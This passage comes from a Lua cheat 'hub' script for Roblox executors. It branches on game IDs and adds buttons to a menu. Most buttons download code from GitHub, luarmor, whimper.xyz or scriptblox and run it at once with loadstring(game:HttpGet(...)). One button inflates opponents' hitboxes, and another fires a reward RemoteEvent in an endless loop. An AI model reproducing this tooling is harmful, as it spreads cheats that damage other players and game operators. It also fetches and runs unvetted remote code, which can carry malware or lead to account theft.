         loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/main/refs/heads/main/Loader.lua"))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "fisch",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "w script solara and jj",
      Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/ago106/ScriptsRoblox/refs/heads/main/NewKey'))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "doesnt work on luna and idk what other executers",
      Callback = function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
      end, 
   })

   -- Aimblox
elseif game.GameId==2585430167 then
   local gameTab = Window:CreateTab("Aimblox", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Aimblox")

   local Button = gameTab:CreateButton({
      Name = "BIG HITBOX OP! ",
      Callback = function()
         _G.HeadSize = 20 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.Head.Transparency = 1 v.Character.Head.BrickColor = BrickColor.new("Red") v.Character.Head.Material = "Neon" v.Character.Head.CanCollide = false v.Character.Head.Massless = true end) end end end end) 
      end, 
   })

   -- Ninja legends
elseif game.GameId==1335695570 then
   local gameTab = Window:CreateTab("Ninja legends", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Ninja legends!")

   local Button = gameTab:CreateButton({
      Name = "OWL HUB",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "ZEPSSY HUB OP!",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zepsyy2/asd/main/Ninja%20Legends.lua"))()
      end, 
   })

   -- Tycoon Rng
elseif game.GameId==6026836726 then
   local gameTab = Window:CreateTab("Tycoon Rng", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Tycoon Rng!")
   
   local Button = gameTab:CreateButton({
      Name = "Tycoon Rng",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
      end, 
   })

   -- Bee Swarm Simulater
elseif game.GameId==601130232 then
   local gameTab = Window:CreateTab("Bee Swarm Simulater", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Bee Swarm Simulater!")
   
   local Button = gameTab:CreateButton({
      Name = "Bee Swarm Simulater",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeSwarmSim/main/BeeSwarmSim"))()
      end, 
   })
   
   local Button = gameTab:CreateButton({
      Name = "Bee Swarm Simulater",
      Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Histy"))()  
      end, 
   })
   
   local Button = gameTab:CreateButton({
      Name = "Bee Swarm Simulater",
      Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/29"))()
      end, 
   })
   
   -- Cabin Crew Simulater
elseif game.GameId==1802741133 then
   local gameTab = Window:CreateTab("Cabin Crew Simulater", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Cabin Crew Simulater!")

   local Button = gameTab:CreateButton({
      Name = "Kitty Hub CLoses THE HUB!",
      Callback = function()
         loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
      end, 
   })

   -- Block Eaters
elseif game.GameId==5588099401 then
   local gameTab = Window:CreateTab("Block Eaters", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Block Eaters")
  
   local Button = gameTab:CreateButton({
      Name = "Infinite Size",
      Callback = function()
         while wait() do
            local args = {
                [1] = 12
            }
            
            game:GetService("ReplicatedStorage").Honeypot.Internal.RemoteStorage:FindFirstChild("ClaimPlaytimeReward - RemoteEvent"):FireServer(unpack(args))
            end
      end, 
   })

   -- pet sim 99
elseif game.GameId==3317771874 then
   local gameTab = Window:CreateTab("pet sim 99", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("pet sim 99!")

   local Button = gameTab:CreateButton({
      Name = "Has Multiple Games Inside w ",
      Callback = function()
         loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nuke-Hub-V4-SOLARA-Support-KEYLESS-16495"))()
      end, 
   })

   





   


 
        -- Put more script here but this last part should be end of the code as always



        -- dont touch code below this
else 
    local gametab = Window:CreateTab("Game Not Supported", 4483362458)
    local Label = gametab:CreateLabel("Game Not Supported  Join Supported Game", "ban")
    end
